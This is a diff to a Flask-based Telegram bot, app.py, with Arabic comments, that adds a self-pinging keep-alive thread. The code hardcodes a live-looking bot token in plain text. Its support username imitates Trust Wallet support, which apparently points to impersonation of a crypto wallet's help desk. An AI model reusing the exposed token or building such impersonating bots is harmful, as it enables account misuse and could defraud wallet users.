@@ -1,12 +1,12 @@
-# app.py (FINAL) - معدل مع إصلاح التوكن
+# app.py (FINAL) - مع إضافة keep-alive
 from flask import Flask, request
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import os, json, time, tempfile, threading, random
+import os, json, time, tempfile, threading, random, requests
 from datetime import datetime, timedelta
 
 # ---------------- CONFIG (تأكد من التوكن) ----------------
-BOT_TOKEN = "8385331860:AAHj0uPnpJf_JYtHjALIkmavsBNnpa_Gd2Y"  # تأكد من هذا السطر!
+BOT_TOKEN = "8385331860:AAHj0uPnpJf_JYtHjALIkmavsBNnpa_Gd2Y"
 ADMIN_ID = 8400225549
 SUPPORT_USERNAME = "Trust_wallet_Support_3"
 DATA_FILE = "database.json"
@@ -33,6 +33,16 @@ data = {
     "transactions": []
 }
 _lock = threading.Lock()
+
+# ---------- keep-alive function ----------
+def keep_alive():
+    while True:
+        try:
+            response = requests.get(WEBHOOK_BASE, timeout=10)
+            print(f"✅ Keep-alive: {response.status_code} - {datetime.utcnow().isoformat()}")
+        except Exception as e:
+            print(f"❌ Keep-alive failed: {e}")
+        time.sleep(300)  # كل 5 دقائق
 
 # ---------- atomic write helpers ----------
 def atomic_write(path, content):
@@ -634,8 +644,10 @@ def before_first_request():
 # ---------- startup ----------
 if __name__ == "__main__":
     load_data()
-    t = threading.Thread(target=autosave_loop, daemon=True)
-    t.start()
+    t1 = threading.Thread(target=autosave_loop, daemon=True)
+    t1.start()
+    t2 = threading.Thread(target=keep_alive, daemon=True)
+    t2.start()
     
     port = int(os.environ.get("PORT", 10000))
     print(f"🚀 Starting on port {port}")
